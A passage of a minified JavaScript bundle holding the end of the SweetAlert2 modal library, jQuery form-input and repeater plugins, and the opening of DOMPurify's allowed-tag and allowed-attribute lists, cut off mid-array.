"function" == typeof t && setTimeout(function () { t() }) }; function _t(t, e, n) { var i = ut.domCache.get(t); e.forEach(function (t) { i[t].disabled = n }) } function Vt(t, e) { if (!t) return !1; if ("radio" === t.type) for (var n = t.parentNode.parentNode.querySelectorAll("input"), i = 0; i < n.length; i++)n[i].disabled = e; else t.disabled = e } var Lt = (t(zt, [{ key: "start", value: function () { return this.running || (this.running = !0, this.started = new Date, this.id = setTimeout(this.callback, this.remaining)), this.remaining } }, { key: "stop", value: function () { return this.running && (this.running = !1, clearTimeout(this.id), this.remaining -= new Date - this.started), this.remaining } }, { key: "increase", value: function (t) { var e = this.running; return e && this.stop(), this.remaining += t, e && this.start(), this.remaining } }, { key: "getTimerLeft", value: function () { return this.running && (this.stop(), this.start()), this.remaining } }, { key: "isRunning", value: function () { return this.running } }]), zt), Mt = { email: function (t, e) { return /^[a-zA-Z0-9.+_-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]{2,24}$/.test(t) ? Promise.resolve() : Promise.resolve(e || "Invalid email address") }, url: function (t, e) { return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{2,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(t) ? Promise.resolve() : Promise.resolve(e || "Invalid URL") } }; function zt(t, e) { i(this, zt), this.callback = t, this.remaining = e, this.running = !1, this.start() } function Pt(t, e) { t.removeEventListener(lt, Pt), e.style.overflowY = "auto" } function Kt(t) { var e, n, i, o = E(), a = ot(); null !== t.onBeforeOpen && "function" == typeof t.onBeforeOpen && t.onBeforeOpen(a), t.animation && (et(a, D.show), et(o, D.fade)), N(a), lt && m(a) ? (o.style.overflowY = "hidden", a.addEventListener(lt, Pt.bind(null, a, o))) : o.style.overflowY = "auto", et([document.documentElement, document.body, o], D.shown), t.heightAuto && t.backdrop && !t.toast && et([document.documentElement, document.body], D["height-auto"]), at() && (!t.scrollbarPadding || null === A.previousBodyPadding && document.body.scrollHeight > window.innerHeight && (A.previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right")), document.body.style.paddingRight = A.previousBodyPadding + function () { if ("ontouchstart" in window || navigator.msMaxTouchPoints) return 0; var t = document.createElement("div"); t.style.width = "50px", t.style.height = "50px", t.style.overflow = "scroll", document.body.appendChild(t); var e = t.offsetWidth - t.clientWidth; return document.body.removeChild(t), e }() + "px"), !/iPad|iPhone|iPod/.test(navigator.userAgent) || window.MSStream || h(document.body, D.iosfix) || (e = document.body.scrollTop, document.body.style.top = -1 * e + "px", et(document.body, D.iosfix), (i = E()).ontouchstart = function (t) { n = t.target === i || !(i.scrollHeight > i.clientHeight) && "INPUT" !== t.target.tagName }, i.ontouchmove = function (t) { n && (t.preventDefault(), t.stopPropagation()) }), "undefined" != typeof window && Dt() && (Zt(), window.addEventListener("resize", Zt)), I(document.body.children).forEach(function (t) { var e, n; t === E() || (e = t, n = E(), "function" == typeof e.contains && e.contains(n)) || (t.hasAttribute("aria-hidden") && t.setAttribute("data-previous-aria-hidden", t.getAttribute("aria-hidden")), t.setAttribute("aria-hidden", "true")) }), setTimeout(function () { o.scrollTop = 0 })), st() || xt.previousActiveElement || (xt.previousActiveElement = document.activeElement), null !== t.onOpen && "function" == typeof t.onOpen && setTimeout(function () { t.onOpen(a) }) } var Jt, jt = { select: function (t, e, o) { var a = it(t, D.select); e.forEach(function (t) { var e = t[0], n = t[1], i = document.createElement("option"); i.value = e, i.innerHTML = n, o.inputValue.toString() === e.toString() && (i.selected = !0), a.appendChild(i) }), a.focus() }, radio: function (t, e, s) { var r = it(t, D.radio); e.forEach(function (t) { var e = t[0], n = t[1], i = document.createElement("input"), o = document.createElement("label"); i.type = "radio", i.name = D.radio, i.value = e, s.inputValue.toString() === e.toString() && (i.checked = !0); var a = document.createElement("span"); a.innerHTML = n, a.className = D.label, o.appendChild(i), o.appendChild(a), r.appendChild(o) }); var n = r.querySelectorAll("input"); n.length && n[0].focus() } }, $t = Object.freeze({ hideLoading: kt, disableLoading: kt, getInput: function (t) { var e = ut.innerParams.get(t || this); return p(ut.domCache.get(t || this).content, e.input) }, close: Rt, closePopup: Rt, closeModal: Rt, closeToast: Rt, enableButtons: function () { _t(this, ["confirmButton", "cancelButton"], !1) }, disableButtons: function () { _t(this, ["confirmButton", "cancelButton"], !0) }, enableConfirmButton: function () { u("Swal.disableConfirmButton()", "Swal.getConfirmButton().removeAttribute('disabled')"), _t(this, ["confirmButton"], !1) }, disableConfirmButton: function () { u("Swal.enableConfirmButton()", "Swal.getConfirmButton().setAttribute('disabled', '')"), _t(this, ["confirmButton"], !0) }, enableInput: function () { return Vt(this.getInput(), !1) }, disableInput: function () { return Vt(this.getInput(), !0) }, showValidationMessage: function (t) { var e = ut.domCache.get(this); e.validationMessage.innerHTML = t; var n = window.getComputedStyle(e.popup); e.validationMessage.style.marginLeft = "-".concat(n.getPropertyValue("padding-left")), e.validationMessage.style.marginRight = "-".concat(n.getPropertyValue("padding-right")), N(e.validationMessage); var i = this.getInput(); i && (i.setAttribute("aria-invalid", !0), i.setAttribute("aria-describedBy", D["validation-message"]), v(i), et(i, D.inputerror)) }, resetValidationMessage: function () { var t = ut.domCache.get(this); t.validationMessage && T(t.validationMessage); var e = this.getInput(); e && (e.removeAttribute("aria-invalid"), e.removeAttribute("aria-describedBy"), nt(e, D.inputerror)) }, getProgressSteps: function () { return u("Swal.getProgressSteps()", "const swalInstance = Swal.fire({progressSteps: ['1', '2', '3']}); const progressSteps = swalInstance.params.progressSteps"), ut.innerParams.get(this).progressSteps }, setProgressSteps: function (t) { u("Swal.setProgressSteps()", "Swal.update()"); var e = a({}, ut.innerParams.get(this), { progressSteps: t }); At(0, e), ut.innerParams.set(this, e) }, showProgressSteps: function () { N(ut.domCache.get(this).progressSteps) }, hideProgressSteps: function () { T(ut.domCache.get(this).progressSteps) }, _main: function (t) { var A = this; !function (t) { for (var e in t) Bt(i = e) || k('Unknown parameter "'.concat(i, '"')), t.toast && (n = e, -1 !== Xt.indexOf(n) && k('The parameter "'.concat(n, '" is incompatible with toasts'))), yt(void 0) && u(void 0, yt(void 0)); var n, i }(t); var p = a({}, Qt, t); !function (e) { e.inputValidator || Object.keys(Mt).forEach(function (t) { e.input === t && (e.inputValidator = Mt[t]) }), e.showLoaderOnConfirm && !e.preConfirm && k("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request"), e.animation = y(e.animation), e.target && ("string" != typeof e.target || document.querySelector(e.target)) && ("string" == typeof e.target || e.target.appendChild) || (k('Target parameter is not valid, defaulting to "body"'), e.target = "body"), "string" == typeof e.title && (e.title = e.title.split("\n").join("<br />")); var t, n, i, o, a, s, r, g, l, c, I, u, h, d, C, A = ot(), p = "string" == typeof e.target ? document.querySelector(e.target) : e.target; (!A || A && p && A.parentNode !== p.parentNode) && (t = e, (C = E()) && (C.parentNode.removeChild(C), nt([document.documentElement, document.body], [D["no-backdrop"], D["toast-shown"], D["has-column"]])), j() ? X("SweetAlert2 requires document to initialize") : ((n = document.createElement("div")).className = D.container, n.innerHTML = rt, (i = "string" == typeof (d = t.target) ? document.querySelector(d) : d).appendChild(n), u = t, (h = ot()).setAttribute("role", u.toast ? "alert" : "dialog"), h.setAttribute("aria-live", u.toast ? "polite" : "assertive"), u.toast || h.setAttribute("aria-modal", "true"), "rtl" === window.getComputedStyle(i).direction && et(E(), D.rtl), o = _(), a = it(o, D.input), s = it(o, D.file), r = o.querySelector(".".concat(D.range, " input")), g = o.querySelector(".".concat(D.range, " output")), l = it(o, D.select), c = o.querySelector(".".concat(D.checkbox, " input")), I = it(o, D.textarea), a.oninput = $, s.onchange = $, l.onchange = $, c.onchange = $, I.oninput = $, r.oninput = function (t) { $(t), g.value = r.value }, r.onchange = function (t) { $(t), r.nextSibling.value = r.value })) }(p), Object.freeze(p), xt.timeout && (xt.timeout.stop(), delete xt.timeout), clearTimeout(xt.restoreFocusTimeout); var m = { popup: ot(), container: E(), content: _(), actions: z(), confirmButton: L(), cancelButton: M(), closeButton: J(), validationMessage: G(), progressSteps: Q() }; ut.domCache.set(this, m), pt(this, p), ut.innerParams.set(this, p); var f = this.constructor; return new Promise(function (t) { function n(t) { A.closePopup({ value: t }) } function r(t) { A.closePopup({ dismiss: t }) } Ht.swalPromiseResolve.set(A, t), p.timer && (xt.timeout = new Lt(function () { r("timer"), delete xt.timeout }, p.timer)), p.input && setTimeout(function () { var t = A.getInput(); t && v(t) }, 0); for (var e, i, o, a, s, g, l, c = function (e) { p.showLoaderOnConfirm && f.showLoading(), p.preConfirm ? (A.resetValidationMessage(), Promise.resolve().then(function () { return p.preConfirm(e, p.validationMessage) }).then(function (t) { x(m.validationMessage) || !1 === t ? A.hideLoading() : n(void 0 === t ? e : t) })) : n(e) }, I = function (t) { var e, n = t.target, i = m.confirmButton, o = m.cancelButton, a = i && (i === n || i.contains(n)), s = o && (o === n || o.contains(n)); switch (t.type) { case "click": a ? (A.disableButtons(), p.input ? (e = function () { var t = A.getInput(); if (!t) return null; switch (p.input) { case "checkbox": return t.checked ? 1 : 0; case "radio": return t.checked ? t.value : null; case "file": return t.files.length ? t.files[0] : null; default: return p.inputAutoTrim ? t.value.trim() : t.value } }(), p.inputValidator ? (A.disableInput(), Promise.resolve().then(function () { return p.inputValidator(e, p.validationMessage) }).then(function (t) { A.enableButtons(), A.enableInput(), t ? A.showValidationMessage(t) : c(e) })) : A.getInput().checkValidity() ? c(e) : (A.enableButtons(), A.showValidationMessage(p.validationMessage))) : c(!0)) : s && (A.disableButtons(), r(f.DismissReason.cancel)) } }, u = m.popup.querySelectorAll("button"), h = 0; h < u.length; h++)u[h].onclick = I, u[h].onmouseover = I, u[h].onmouseout = I, u[h].onmousedown = I; function d(t, e) { var n = w(p.focusCancel), i = 0; if (i < n.length) return (t += e) === n.length ? t = 0 : -1 === t && (t = n.length - 1), n[t].focus(); m.popup.focus() } function C(t) { return jt[g.input](l, (e = t, n = [], "undefined" != typeof Map && e instanceof Map ? e.forEach(function (t, e) { n.push([e, t]) }) : Object.keys(e).forEach(function (t) { n.push([t, e[t]]) }), n), g); var e, n } m.closeButton.onclick = function () { r(f.DismissReason.close) }, p.toast ? m.popup.onclick = function () { p.showConfirmButton || p.showCancelButton || p.showCloseButton || p.input || r(f.DismissReason.close) } : (e = !1, m.popup.onmousedown = function () { m.container.onmouseup = function (t) { m.container.onmouseup = void 0, t.target === m.container && (e = !0) } }, m.container.onmousedown = function () { m.popup.onmouseup = function (t) { m.popup.onmouseup = void 0, t.target !== m.popup && !m.popup.contains(t.target) || (e = !0) } }, m.container.onclick = function (t) { e ? e = !1 : t.target === m.container && y(p.allowOutsideClick) && r(f.DismissReason.backdrop) }), p.reverseButtons ? m.confirmButton.parentNode.insertBefore(m.cancelButton, m.confirmButton) : m.confirmButton.parentNode.insertBefore(m.confirmButton, m.cancelButton), xt.keydownTarget && xt.keydownHandlerAdded && (xt.keydownTarget.removeEventListener("keydown", xt.keydownHandler, { capture: xt.keydownListenerCapture }), xt.keydownHandlerAdded = !1), p.toast || (xt.keydownHandler = function (t) { return function (t, e) { if (e.stopKeydownPropagation && t.stopPropagation(), "Enter" !== t.key || t.isComposing) if ("Tab" === t.key) { for (var n = t.target, i = w(e.focusCancel), o = -1, a = 0; a < i.length; a++)if (n === i[a]) { o = a; break } t.shiftKey ? d(o, -1) : d(o, 1), t.stopPropagation(), t.preventDefault() } else -1 !== ["ArrowLeft", "ArrowRight", "ArrowUp", "ArrowDown", "Left", "Right", "Up", "Down"].indexOf(t.key) ? document.activeElement === m.confirmButton && x(m.cancelButton) ? m.cancelButton.focus() : document.activeElement === m.cancelButton && x(m.confirmButton) && m.confirmButton.focus() : "Escape" !== t.key && "Esc" !== t.key || !0 !== y(e.allowEscapeKey) || (t.preventDefault(), r(f.DismissReason.esc)); else if (t.target && A.getInput() && t.target.outerHTML === A.getInput().outerHTML) { if (-1 !== ["textarea", "file"].indexOf(e.input)) return; f.clickConfirm(), t.preventDefault() } }(t, p) }, xt.keydownTarget = p.keydownListenerCapture ? window : m.popup, xt.keydownListenerCapture = p.keydownListenerCapture, xt.keydownTarget.addEventListener("keydown", xt.keydownHandler, { capture: xt.keydownListenerCapture }), xt.keydownHandlerAdded = !0), A.enableButtons(), A.hideLoading(), A.resetValidationMessage(), (p.toast && (p.input || p.footer || p.showCloseButton) ? et : nt)(document.body, D["toast-column"]), "select" === p.input || "radio" === p.input ? (s = A, g = p, l = _(), B(g.inputOptions) ? (bt(), g.inputOptions.then(function (t) { s.hideLoading(), C(t) })) : "object" === b(g.inputOptions) ? C(g.inputOptions) : X("Unexpected type of inputOptions! Expected object, Map or Promise, got ".concat(b(g.inputOptions)))) : -1 !== ["text", "email", "number", "tel", "textarea"].indexOf(p.input) && B(p.inputValue) && (o = p, T(a = (i = A).getInput()), o.inputValue.then(function (t) { a.value = "number" === o.input ? parseFloat(t) || 0 : t + "", N(a), a.focus(), i.hideLoading() }).catch(function (t) { X("Error in inputValue promise: " + t), a.value = "", N(a), a.focus(), (void 0).hideLoading() })), Kt(p), p.toast || (y(p.allowEnterKey) ? p.focusCancel && x(m.cancelButton) ? m.cancelButton.focus() : p.focusConfirm && x(m.confirmButton) ? m.confirmButton.focus() : d(-1, 1) : document.activeElement && "function" == typeof document.activeElement.blur && document.activeElement.blur()), m.container.scrollTop = 0 }) }, update: function (e) { var n = {}; Object.keys(e).forEach(function (t) { te.isUpdatableParameter(t) ? n[t] = e[t] : k('Invalid parameter to update: "'.concat(t, '". Updatable params are listed here: https://github.com/sweetalert2/sweetalert2/blob/master/src/utils/params.js')) }); var t = a({}, ut.innerParams.get(this), n); pt(this, t), ut.innerParams.set(this, t), Object.defineProperties(this, { params: { value: a({}, this.params, e), writable: !1, enumerable: !0 } }) } }); function qt() { if ("undefined" != typeof window) { "undefined" == typeof Promise && X("This package requires a Promise library, please include a shim to enable it in this browser (See: https://github.com/sweetalert2/sweetalert2/wiki/Migration-from-SweetAlert-to-SweetAlert2#1-ie-support)"), Jt = this; for (var t = arguments.length, e = new Array(t), n = 0; n < t; n++)e[n] = arguments[n]; var i = Object.freeze(this.constructor.argsToParams(e)); Object.defineProperties(this, { params: { value: i, writable: !1, enumerable: !0, configurable: !0 } }); var o = this._main(this.params); ut.promise.set(this, o) } } qt.prototype.then = function (t) { return ut.promise.get(this).then(t) }, qt.prototype.finally = function (t) { return ut.promise.get(this).finally(t) }, a(qt.prototype, $t), a(qt, St), Object.keys($t).forEach(function (t) { qt[t] = function () { if (Jt) return Jt[t].apply(Jt, arguments) } }), qt.DismissReason = C, qt.version = "8.12.1"; var te = qt; return te.default = te }), void 0 !== this && this.Sweetalert2 && (this.swal = this.sweetAlert = this.Swal = this.SweetAlert = this.Sweetalert2), swal.mixin({ width: 400, heightAuto: !1, padding: "2.5rem", buttonsStyling: !1, confirmButtonClass: "btn btn-success", confirmButtonColor: null, cancelButtonClass: "btn btn-secondary", cancelButtonColor: null }); var identity = function (t) { return t }, isArray = function (t) { return $.isArray(t) }, isObject = function (t) { return !isArray(t) && t instanceof Object }, isNumber = function (t) { return t instanceof Number }, isFunction = function (t) { return t instanceof Function }, indexOf = function (t, e) { return $.inArray(e, t) }, inArray = function (t, e) { return -1 !== indexOf(t, e) }, foreach = function (t, e) { for (var n in t) t.hasOwnProperty(n) && e(t[n], n, t) }, last = function (t) { return t[t.length - 1] }, argumentsToArray = function (t) { return Array.prototype.slice.call(t) }, extend = function () { var n = {}; return foreach(argumentsToArray(arguments), function (t) { foreach(t, function (t, e) { n[e] = t }) }), n }, mapToArray = function (t, i) { var o = []; return foreach(t, function (t, e, n) { o.push(i(t, e, n)) }), o }, mapToObject = function (t, i, o) { var a = {}; return foreach(t, function (t, e, n) { e = o ? o(e, t) : e, a[e] = i(t, e, n) }), a }, map = function (t, e, n) { return isArray(t) ? mapToArray(t, e) : mapToObject(t, e, n) }, pluck = function (t, e) { return map(t, function (t) { return t[e] }) }, filter = function (t, i) { var o; return isArray(t) ? (o = [], foreach(t, function (t, e, n) { i(t, e, n) && o.push(t) })) : (o = {}, foreach(t, function (t, e, n) { i(t, e, n) && (o[e] = t) })), o }, call = function (t, n, i) { return map(t, function (t, e) { return t[n].apply(t, i || []) }) }, throttle = function (e, n) { var i = null; return function () { var t = arguments; null === i && (i = setTimeout(function () { i = null }, e), n.apply(this, t)) } }, mixinPubSub = function (t) { var i = {}; return (t = t || {}).publish = function (t, e) { foreach(i[t], function (t) { t(e) }) }, t.subscribe = function (t, e) { i[t] = i[t] || [], i[t].push(e) }, t.unsubscribe = function (n) { foreach(i, function (t) { var e = indexOf(t, n); -1 !== e && t.splice(e, 1) }) }, t }; !function (r) { "use strict"; function o(t, i) { var o, a = mixinPubSub(), e = t.$; return a.getType = function () { throw 'implement me (return type. "text", "radio", etc.)' }, a.$ = function (t) { return t ? e.find(t) : e }, a.disable = function () { a.$().prop("disabled", !0), a.publish("isEnabled", !1) }, a.enable = function () { a.$().prop("disabled", !1), a.publish("isEnabled", !0) }, i.equalTo = function (t, e) { return t === e }, i.publishChange = function (t, e) { var n = a.get(); i.equalTo(n, o) || a.publish("change", { e: t, domElement: e }), o = n }, a } function i(t, e) { var n = o(t, e); return n.get = function () { return n.$().val() }, n.set = function (t) { n.$().val(t) }, n.clear = function () { n.set("") }, e.buildSetter = function (e) { return function (t) { e.call(n, t) } }, n } function a(t, e) { t = isArray(t) ? t : [t], e = isArray(e) ? e : [e]; var n = !0; return t.length !== e.length ? n = !1 : foreach(t, function (t) { inArray(e, t) || (n = !1) }), n } function g(t) { var e = {}, n = i(t, e); return n.getType = function () { return "button" }, n.$().on("change", function (t) { e.publishChange(t, this) }), n } function l(t) { var e = {}, n = i(t, e); return n.getType = function () { return "checkbox" }, n.get = function () { var t = []; return n.$().filter(":checked").each(function () { t.push(r(this).val()) }), t }, n.set = function (t) { t = isArray(t) ? t : [t], n.$().each(function () { r(this).prop("checked", !1) }), foreach(t, function (t) { n.$().filter('[value="' + t + '"]').prop("checked", !0) }) }, e.equalTo = a, n.$().change(function (t) { e.publishChange(t, this) }), n } function c(t) { var e = B(t, {}); return e.getType = function () { return "email" }, e } function I(t) { var e = {}, n = o(t, e); return n.getType = function () { return "file" }, n.get = function () { return last(n.$().val().split("\\")) }, n.clear = function () { this.$().each(function () { r(this).wrap("<form>").closest("form").get(0).reset(), r(this).unwrap() }) }, n.$().change(function (t) { e.publishChange(t, this) }), n } function u(t) { var e = {}, n = i(t, e); return n.getType = function () { return "hidden" }, n.$().change(function (t) { e.publishChange(t, this) }), n } function h(t) { var e = {}, i = o(t, e); return i.getType = function () { return "file[multiple]" }, i.get = function () { for (var t = i.$().get(0).files || [], e = [], n = 0; n < (t.length || 0); n += 1)e.push(t[n].name); return e }, i.clear = function () { this.$().each(function () { r(this).wrap("<form>").closest("form").get(0).reset(), r(this).unwrap() }) }, i.$().change(function (t) { e.publishChange(t, this) }), i } function d(t) { var e = {}, n = i(t, e); return n.getType = function () { return "select[multiple]" }, n.get = function () { return n.$().val() || [] }, n.set = function (t) { n.$().val("" === t ? [] : isArray(t) ? t : [t]) }, e.equalTo = a, n.$().change(function (t) { e.publishChange(t, this) }), n } function C(t) { var e = B(t, {}); return e.getType = function () { return "password" }, e } function A(t) { var e = {}, n = i(t, e); return n.getType = function () { return "radio" }, n.get = function () { return n.$().filter(":checked").val() || null }, n.set = function (t) { t ? n.$().filter('[value="' + t + '"]').prop("checked", !0) : n.$().each(function () { r(this).prop("checked", !1) }) }, n.$().change(function (t) { e.publishChange(t, this) }), n } function p(t) { var e = {}, n = i(t, e); return n.getType = function () { return "range" }, n.$().change(function (t) { e.publishChange(t, this) }), n } function m(t) { var e = {}, n = i(t, e); return n.getType = function () { return "select" }, n.$().change(function (t) { e.publishChange(t, this) }), n } function f(t) { var e = {}, n = i(t, e); return n.getType = function () { return "textarea" }, n.$().on("change keyup keydown", function (t) { e.publishChange(t, this) }), n } function b(t) { var e = B(t, {}); return e.getType = function () { return "url" }, e } function s(t) { function e(e, t) { (isObject(t) ? t : a.find(t)).each(function () { var t = r(this).attr("name"); o[t] = s[e]({ $: r(this) }) }) } function n(e, t) { var n = [], i = isObject(t) ? t : a.find(t); isObject(t) ? o[i.attr("name")] = s[e]({ $: i }) : (i.each(function () { -1 === indexOf(n, r(this).attr("name")) && n.push(r(this).attr("name")) }), foreach(n, function (t) { o[t] = s[e]({ $: a.find('input[name="' + t + '"]') }) })) } var o = {}, a = t.$, s = t.constructorOverride || { button: g, text: B, url: b, email: c, password: C, range: p, textarea: f, select: m, "select[multiple]": d, radio: A, checkbox: l, file: I, "file[multiple]": h, hidden: u }; return a.is("input, select, textarea") ? a.is('input[type="button"], button, input[type="submit"]') ? e("button", a) : a.is("textarea") ? e("textarea", a) : a.is('input[type="text"]') || a.is("input") && !a.attr("type") ? e("text", a) : a.is('input[type="password"]') ? e("password", a) : a.is('input[type="email"]') ? e("email", a) : a.is('input[type="url"]') ? e("url", a) : a.is('input[type="range"]') ? e("range", a) : a.is("select") ? a.is("[multiple]") ? e("select[multiple]", a) : e("select", a) : a.is('input[type="file"]') ? a.is("[multiple]") ? e("file[multiple]", a) : e("file", a) : a.is('input[type="hidden"]') ? e("hidden", a) : a.is('input[type="radio"]') ? n("radio", a) : a.is('input[type="checkbox"]') ? n("checkbox", a) : e("text", a) : (e("button", 'input[type="button"], button, input[type="submit"]'), e("text", 'input[type="text"]'), e("password", 'input[type="password"]'), e("email", 'input[type="email"]'), e("url", 'input[type="url"]'), e("range", 'input[type="range"]'), e("textarea", "textarea"), e("select", "select:not([multiple])"), e("select[multiple]", "select[multiple]"), e("file", 'input[type="file"]:not([multiple])'), e("file[multiple]", 'input[type="file"][multiple]'), e("hidden", 'input[type="hidden"]'), n("radio", 'input[type="radio"]'), n("checkbox", 'input[type="checkbox"]')), o } var B = function (t) { var e = {}, n = i(t, e); return n.getType = function () { return "text" }, n.$().on("change keyup keydown", function (t) { e.publishChange(t, this) }), n }; r.fn.inputVal = function (t) { var e = r(this), n = s({ $: e }); return e.is("input, textarea, select") ? void 0 === t ? n[e.attr("name")].get() : (n[e.attr("name")].set(t), e) : void 0 === t ? call(n, "get") : (foreach(t, function (t, e) { n[e].set(t) }), e) }, r.fn.inputOnChange = function (e) { var t = r(this), n = s({ $: t }); return foreach(n, function (t) { t.subscribe("change", function (t) { e.call(t.domElement, t.e) }) }), t }, r.fn.inputDisable = function () { var t = r(this); return call(s({ $: t }), "disable"), t }, r.fn.inputEnable = function () { var t = r(this); return call(s({ $: t }), "enable"), t }, r.fn.inputClear = function () { var t = r(this); return call(s({ $: t }), "clear"), t } }(jQuery), $.fn.repeaterVal = function () { var t, i, o = function (t) { if (1 === t.length && (0 === t[0].key.length || 1 === t[0].key.length && !t[0].key[0])) return t[0].val; foreach(t, function (t) { t.head = t.key.shift() }); var e, n, i = (e = {}, foreach(t, function (t) { e[t.head] || (e[t.head] = []), e[t.head].push(t) }), e); return /^[0-9]+$/.test(t[0].head) ? (n = [], foreach(i, function (t) { n.push(o(t)) })) : (n = {}, foreach(i, function (t, e) { n[e] = o(t) })), n }; return o((t = $(this).inputVal(), i = [], foreach(t, function (t, e) { var n = []; "undefined" !== e && (n.push(e.match(/^[^\[]*/)[0]), n = n.concat(map(e.match(/\[[^\]]*\]/g), function (t) { return t.replace(/[\[\]]/g, "") })), i.push({ val: t, key: n })) }), i)) }, $.fn.repeater = function (C) { var A; return C = C || {}, $(this).each(function () { function g(t, e) { return t.filter(function () { return !e || 0 === $(this).closest(pluck(e, "selector").join(",")).length }) } function n() { return g(o.find("[data-repeater-item]"), C.repeaters) } var t = $(this), i = C.show || function () { $(this).show() }, e = C.hide || function (t) { t() }, o = t.find("[data-repeater-list]").first(), a = o.find("[data-repeater-item]").first().clone().hide(), s = g(g($(this).find("[data-repeater-item]"), C.repeaters).first().find("[data-repeater-delete]"), C.repeaters); C.isFirstItemUndeletable && s && s.remove(); function r() { var t = o.data("repeater-list"); return C.$parent ? C.$parent.data("item-name") + "[" + t + "]" : t } function l(t) { C.repeaters && t.each(function () { var e = $(this); foreach(C.repeaters, function (t) { e.find(t.selector).repeater(extend(t, { $parent: e })) }) }) } function c(t, e, n) { t && foreach(t, function (t) { n.call(e.find(t.selector)[0], t) }) } var I = function (t, s, r) { t.each(function (o) { var a = $(this); a.data("item-name", s + "[" + o + "]"), g(a.find("[name]"), r).each(function () { var t = $(this), e = t.attr("name").match(/\[[^\]]+\]/g), n = e ? last(e).replace(/\[|\]/g, "") : t.attr("name"), i = s + "[" + o + "][" + n + "]" + (t.is(":checkbox") || t.attr("multiple") ? "[]" : ""); t.attr("name", i), c(r, a, function (t) { var e = $(this); I(g(e.find("[data-repeater-item]"), t.repeaters || []), s + "[" + o + "][" + e.find("[data-repeater-list]").first().data("repeater-list") + "]", t.repeaters) }) }) }), o.find("input[name][checked]").removeAttr("checked").prop("checked", !0) }; I(n(), r(), C.repeaters), l(n()), C.initEmpty && n().remove(), C.ready && C.ready(function () { I(n(), r(), C.repeaters) }); function u(t) { var e = a.clone(); d(e, t), C.repeaters && l(e), i.call(e.get(0)) } var h, d = (h = function (t, e, n) { var i; (e || C.defaultValues) && (i = {}, g(t.find("[name]"), n).each(function () { var t = $(this).attr("name").match(/\[([^\]]*)(\]|\]\[\])$/)[1]; i[t] = $(this).attr("name") }), t.inputVal(map(filter(e || C.defaultValues, function (t, e) { return i[e] }), identity, function (t) { return i[t] }))), c(n, t, function (i) { var o = $(this); g(o.find("[data-repeater-item]"), i.repeaters).each(function () { var n, t = o.find("[data-repeater-list]").data("repeater-list"); e && e[t] ? (n = $(this).clone(), o.find("[data-repeater-item]").remove(), foreach(e[t], function (t) { var e = n.clone(); h(e, t, i.repeaters || []), o.find("[data-repeater-list]").append(e) })) : h($(this), i.defaultValues, i.repeaters || []) }) }) }, function (t, e) { o.append(t), I(n(), r(), C.repeaters), t.find("[name]").each(function () { $(this).inputClear() }), h(t, e || C.defaultValues, C.repeaters) }); A = function (t) { n().remove(), foreach(t, u) }, g(t.find("[data-repeater-create]"), C.repeaters).click(function () { u() }), o.on("click", "[data-repeater-delete]", function () { var t = $(this).closest("[data-repeater-item]").get(0); e.call(t, function () { $(t).remove(), I(n(), r(), C.repeaters) }) }) }), this.setList = A, this }, function (t, e) { "object" == typeof exports && "undefined" != typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define(e) : t.DOMPurify = e() }(this, function () { "use strict"; var t = Object.freeze || function (t) { return t }, At = t(["a", "abbr", "acronym", "address", "area", "article", "aside", "audio", "b", "bdi", "bdo", "big", "blink", "blockquote", "body", "br", "button", "canvas", "caption", "center", "cite", "code", "col", "colgroup", "content", "data", "datalist", "dd", "decorator", "del", "details", "dfn", "dir", "div", "dl", "dt", "element", "em", "fieldset", "figcaption", "figure", "font", "footer", "form", "h1", "h2", "h3", "h4", "h5", "h6", "head", "header", "hgroup", "hr", "html", "i", "img", "input", "ins", "kbd", "label", "legend", "li", "main", "map", "mark", "marquee", "menu", "menuitem", "meter", "nav", "nobr", "ol", "optgroup", "option", "output", "p", "pre", "progress", "q", "rp", "rt", "ruby", "s", "samp", "section", "select", "shadow", "small", "source", "spacer", "span", "strike", "strong", "style", "sub", "summary", "sup", "table", "tbody", "td", "template", "textarea", "tfoot", "th", "thead", "time", "tr", "track", "tt", "u", "ul", "var", "video", "wbr"]), pt = t(["svg", "a", "altglyph", "altglyphdef", "altglyphitem", "animatecolor", "animatemotion", "animatetransform", "audio", "canvas", "circle", "clippath", "defs", "desc", "ellipse", "filter", "font", "g", "glyph", "glyphref", "hkern", "image", "line", "lineargradient", "marker", "mask", "metadata", "mpath", "path", "pattern", "polygon", "polyline", "radialgradient", "rect", "stop", "style", "switch", "symbol", "text", "textpath", "title", "tref", "tspan", "video", "view", "vkern"]), mt = t(["feBlend", "feColorMatrix", "feComponentTransfer", "feComposite", "feConvolveMatrix", "feDiffuseLighting", "feDisplacementMap", "feDistantLight", "feFlood", "feFuncA", "feFuncB", "feFuncG", "feFuncR", "feGaussianBlur", "feMerge", "feMergeNode", "feMorphology", "feOffset", "fePointLight", "feSpecularLighting", "feSpotLight", "feTile", "feTurbulence"]), ft = t(["math", "menclose", "merror", "mfenced", "mfrac", "mglyph", "mi", "mlabeledtr", "mmultiscripts", "mn", "mo", "mover", "mpadded", "mphantom", "mroot", "mrow", "ms", "mspace", "msqrt", "mstyle", "msub", "msup", "msubsup", "mtable", "mtd", "mtext", "mtr", "munder", "munderover"]), bt = t(["#text"]), e = Object.freeze || function (t) { return t }, Bt = e(["accept", "action", "align", "alt", "autocomplete", "background", "bgcolor", "border", "cellpadding", "cellspacing", "checked", "cite", "class", "clear", "color", "cols", "colspan", "coords", "crossorigin", "datetime", "default", "dir", "disabled", "download", "enctype", "face", "for", "headers", "height", "hidden", "high", "href", "hreflang", "id", "integrity", "ismap", "label", "lang", "list", "loop", "low", "max", "maxlength", "media", "method", "min", "multiple", "name", "noshade", "novalidate", "nowrap", "open", "optimum", "pattern", "placeholder", "poster", "preload", "pubdate", "radiogroup", "readonly", "rel", "required", "rev", "reversed", "role", "rows", "rowspan", "spellcheck", "scope", "selected", "shape", "size", "sizes", "span", "srclang", "start", "src", "srcset", "step", "style", "summary", "tabindex", "title", "type", "usemap", "valign", "value", "width", "xmlns"]), yt = e(["accent-height", "accumulate", "additive", "alignment-baseline", "ascent", "attributename", "attributetype", "azimuth", "basefrequency", "baseline-shift", "begin", "bias", "by", "class", "clip", "clip-path", "clip-rule", "color", "color-interpolation", "color-interpolation-filters", "color-profile", "color-rendering", "cx", 